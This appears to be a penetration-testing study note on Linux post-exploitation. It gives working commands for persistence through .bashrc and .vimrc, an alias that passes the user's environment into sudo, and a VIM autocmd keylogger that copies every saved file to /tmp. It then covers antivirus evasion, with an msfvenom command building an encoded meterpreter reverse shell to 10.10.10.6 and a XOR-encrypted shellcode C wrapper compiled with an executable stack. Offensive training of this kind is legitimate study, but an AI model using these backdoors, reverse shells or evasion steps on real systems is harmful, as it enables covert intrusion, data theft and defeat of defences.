## User Configuration Files

In Linux systems, applications frequently store user-specific configuration files and subdirectories
within a user’s home directory. These configuration files control how applications behave for a specific user and are typically only writable by the users or root.
If we compromise a system under a given user, we can modify those files and change how applications behave for them.

Two common examples are **.bash_profile** and **.bashrc**.
- **.bash_profile** is executed when logging in to the system initially(login to machine, or ssh)
- **.bashrc** is executed when a new terminal window is opened from an existing login session
- **can be useful when trying to maintain persistence or escalate privileges**

Example, append touch command to .bashrc, and spawn a new shell will trigger the command execution
```
linux@linuxvictim:~$ echo "touch /tmp/bashtest.txt" >> ~/.bashrc

linux@linuxvictim:~$ /bin/bash
linux@linuxvictim:~$ ls -al /tmp/bashtest.txt
-rw-rw-r-- 1 linux linux 0 Aug 26 15:20 /tmp/bashtest.txt
```
## Attcking with VIM text editor
#### VIM config file backdoor

On many Linux systems, user-specific VIM configuration settings are located in a user’s home directory in the .vimrc file. The commands specified in the .vimrc file are executed when VIM is launched. we can leverage the VIM plugin directory. As long as the files have a .vim extension, all VIM config files located in the user’s **~/.vim/plugin** directory will be loaded
when VIM is run.

We add one line in the user’s **.vimrc** file to the following, this command will mutes debug output and execute /.vimrunscript script.
```
:silent !source ~/.vimrunscript
```

On a Debian or similar system, if the user runs VIM via sudo, our script being sourced does not persist the user’s shell environment
information when moving to a sudo context. We can add an alias to the user’s .bashrc file. source command makes alias changes to go into effect right away.

```
alias sudo="sudo -E"

linux@linuxvictim:~$ source ~/.bashrc
```
#### VIM config keylogger
We can use **:autocmd** in a VIM configuration file or in the editor to set actions for a collection of predefined events. All detials commands can be found at [Vim documentation: autocmd](http://vimdoc.sourceforge.net/htmldoc/autocmd.html)

Now we can set up an autocommand that fires on the BufWritePost action and then writes the content of the file to a log file we specify. We will put our command in
```/home/linux/.vim/plugin/settings.vim```

```
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
```
**BufWritePost** us the event, meaning that after a buffer is written to a file, we will perform our action. “*” specifies this action will be performed for all files being edited. **:w!** save the buffer contents, **!** is a force modifier, it will overwrite an existing file.

VIM supports the use of basic if statements in its configuration scripts
```
:if <some condition>
:<some command>
:else
:<some alternative command>
:endif
```

below example will check if user os running as root

```
:if $USER == "root"
:autocmd BufWritePost * :silent :w! >> /tmp/hackedfromvim.txt
:endif
```

## Bypass AV with encoder and C code wrapper

First, let's test our linux scan with [eicar](https://www.eicar.org/?page_id=3950) project. ```sudo kesl-control --scan-file ./eicar.txt```. The the eicar.txt should be removed. Otherwise, the scanner is not working. We can also check the Kaspersky’s event log for detected events ```sudo kesl-control -E --query | grep DetectName```.

#### Bypass with x64/zutto_dekiru encoder
this method bypass Kaspersky scanner, but not all scanners at [Antiscan.me](https://antiscan.me/)

```
sudo msfvenom -p linux/x64/meterpreter/reverse_tcp LPORT=443 LHOST=10.10.10.6 -e x64/zutto_dekiru -f elf -o /tmp/met64zutto.elf
```

#### Bypass with C code wrapper and xor encrytion.

We can use the msfvenom to create c shell code, xor the shell code, wrap the xored shell code in c file, add decrypt function, and compile c file into exe.
- [encoder.c](/08PlayingWithLinux/encoder.c) encrypt shell code and print out encrypted payload
- [CWrapper.c](/08PlayingWithLinux/CWrapper.c) decrypt shell code and run

Compile encoder and run encoder
```
kali@kali:~$ gcc -o encoder.out encoder.c

kali@kali:~$ ./encoder.out
\x20\x73\x12\x45\x4F\x02\xCF\x8A\
```

Compile shellcode wrapper, don't forget to compile the c code in the same architecture as target's
```
kali@kali:~$ gcc -o CWrapper.out CWrapper.c -z execstack
```
